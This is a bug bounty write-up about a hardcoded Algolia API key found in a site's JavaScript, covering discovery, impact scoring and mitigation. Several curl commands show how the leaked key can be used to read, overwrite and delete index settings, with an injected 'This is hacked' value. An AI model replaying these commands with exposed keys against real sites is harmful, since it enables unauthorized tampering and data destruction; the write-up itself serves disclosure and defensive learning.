---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-04-26_api-misconfiguration-algolia-api-key_2.md
original_filename: 2023-04-26_api-misconfiguration-algolia-api-key_2.md
title: API Misconfiguration - Algolia API Key
category: documents
detected_topics:
- api-security
- access-control
- command-injection
- cloud-security
tags:
- imported
- documents
- api-security
- access-control
- command-injection
- cloud-security
language: en
raw_sha256: de5622fa02b690fad76ca46572582927dcebbc9c82cabfe499cc0a93c4ee0b0a
text_sha256: 4499a5912fe888041b1aa505ab11872253682e28a82e7d18a644f3c20ffa295e
ingested_at: '2026-06-28T07:32:20Z'
sensitivity: unknown
redactions_applied: true
---

# API Misconfiguration - Algolia API Key

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-04-26_api-misconfiguration-algolia-api-key_2.md
- Source Type: markdown
- Detected Topics: api-security, access-control, command-injection, cloud-security
- Ingested At: 2026-06-28T07:32:20Z
- Redactions Applied: True
- Raw SHA256: `de5622fa02b690fad76ca46572582927dcebbc9c82cabfe499cc0a93c4ee0b0a`
- Text SHA256: `4499a5912fe888041b1aa505ab11872253682e28a82e7d18a644f3c20ffa295e`


## Content

---
title: "API Misconfiguration - Algolia API Key"
url: "https://shahjerry33.medium.com/api-misconfiguration-algolia-api-key-b3f4a9f04f0d"
authors: ["Jerry Shah (@Jerry)"]
bugs: ["Hardcoded API keys"]
publication_date: "2023-04-26"
added_date: "2023-04-27"
source: "pentester.land/writeups.json"
original_index: 1222
scraped_via: "browseros"
---

# API Misconfiguration - Algolia API Key

API Misconfiguration - Algolia API Key
Jerry Shah (Jerry)
Follow
5 min read
·
Apr 25, 2023

301

5

Press enter or click to view image in full size

Summary

CRUD stands for Create, Read, Update, and Delete which are the four basic operations that are performed on data stored in a database. When building an API, these CRUD operations are often used for creating a basic interface for interacting with a database to perform these operations. These CRUD operations form the basic building blocks for interacting with a database through an API and are used to create, read, update and delete data as needed. The implementation of these operations can vary depending on the specific requirements of an application but the basic concept remains the same.

Create: This operation is used to create a new record in the database. The API accepts the data as an input, usually in JSON format and then inserts this data into the database as a new record.
Read: This operation is used to retrieve data from the database. The API accepts a query, such as the ID of a specific record and then returns the data for that record to the user.
Update: This operation is used to modify an existing record in the database. The API accepts the data as an input, usually in JSON format and then updates the corresponding record in the database with the new data.
Delete: This operation is used to delete a record from the database. The API accepts a query, such as the ID of a specific record and then deletes the corresponding record from the database.

Description

We have identified an API misconfiguration of Algolia API Key on one of the program of YesWeHack for which we were awarded 500 Euros. We found all the three things required to exploit the Algolia API key which are Algolia API Key, Algolia Application ID, Algolia Index Name and all the three things were being disclosed in the .js file. We took the exploit from Github Keyhacks and used it with the API key.

Here are the corresponding HTTP verbs for each operation:

Create: HTTP POST
Read: HTTP GET
Update: HTTP PUT or HTTP PATCH
Delete: HTTP DELETE

HTTP POST is used to create a new resource on the server. The request payload typically contains the data to be stored.

Example

curl -X POST --url https://<application-id>-1.algolianet.com/1/indexes/<example-index>/settings --header ‘content-type: application/json’ --header ‘x-algolia-api-key=***REDACTED*** --header ‘x-algolia-application-id: <example-application-id>’ --data ‘{“highlightPreTag”: “This is hacked”}’

HTTP GET is used to retrieve/read the data of a resource from the server. The response payload typically contains the data that represents the resource.

Example

curl --url https://<application-id>-1.algolianet.com/1/indexes/<example-index>/settings --header ‘content-type: application/json’ --header ‘x-algolia-api-key=***REDACTED*** --header ‘x-algolia-application-id: <example-application-id>’

HTTP PUT is used to replace the entire data of a resource on the server with a new one. The request payload typically contains the new data to replace the old data.

Example

curl -X PUT --url https://<application-id>-1.algolianet.com/1/indexes/<example-index>/settings --header ‘content-type: application/json’ --header ‘x-algolia-api-key=***REDACTED*** --header ‘x-algolia-application-id: <example-application-id>’ --data ‘{“highlightPreTag”: “This is hacked”}’

HTTP PATCH is used to partially update a resource on the server. The request payload typically contains only the changes that need to be made to the existing data.

Example

curl -X PATCH --url https://<application-id>-1.algolianet.com/1/indexes/<example-index>/settings --header ‘content-type: application/json’ --header ‘x-algolia-api-key=***REDACTED*** --header ‘x-algolia-application-id: <example-application-id>’ --data ‘{“highlightPreTag”: “This is hacked”}’

HTTP DELETE is used to remove a resource from the server. The request payload is usually empty, as the server will simply remove the resource identified by the URL.

Example

curl -X DELETE --url https://<application-id>-1.algolianet.com/1/indexes/<example-index>/settings --header ‘content-type: application/json’ --header ‘x-algolia-api-key=***REDACTED*** --header ‘x-algolia-application-id: <example-application-id>’ --data ‘{“highlightPreTag”: “This is hacked”}’

Exploit Code using Curl Command:

Get Jerry Shah (Jerry)’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

https://github.com/streaak/keyhacks#Algolia-API-key

Press enter or click to view image in full size
Key Hacks - Github

How we found this vulnerability ?

We found a path to .js file in source code and then we searched for the API key in a .js file
Press enter or click to view image in full size
Algolia API Key

2. We used the curl command to check the basic misconfiguration of the Algolia API Key (Update Operation)

Press enter or click to view image in full size
Curl Command
Press enter or click to view image in full size
Update Operation

3. Then using burpsuite, we visited the URL shown in the exploit of Algolia API key and checked the response

Press enter or click to view image in full size
Burpsuite
Press enter or click to view image in full size
Response

4. We opened the response in browser

Press enter or click to view image in full size
Create Operation

5. We performed the read operation to read different indexes

Press enter or click to view image in full size
Burpsuite
Press enter or click to view image in full size
Read Operation

NOTE: Delete operation was also possible but after discussing with the company it was not allowed to perform a DELETE operation.

Why this happened ?

In my opinion,

It happened because of the three main flaws

Client Side API Storage

The application was storing the API key and its data on the client side.

2. Improper Authorization

The application did not had proper authorization check against the API calls being made.

3. Insecure API endpoints

The sensitive API endpoints were accessible to all users.

Impact

Any user will be able to create, read, update and delete the things on the website. An attacker can add his/her own content on the website and can delete the available content of the website.

Calculated CVSS

Vector String : CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

Score : 9.8 (Critical)

Mitigation

There are three things that needs to be implemented to mitigate this issue which are

Implementing proper authentication and authorization mechanisms to ensure that only authorized users can perform CRUD operations
Do not store API keys and secrets on the client side
Keep your API up-to-date with the latest security patches and updates to prevent known vulnerabilities and exploits

Collaboration done with:

Sushil

Press enter or click to view image in full size
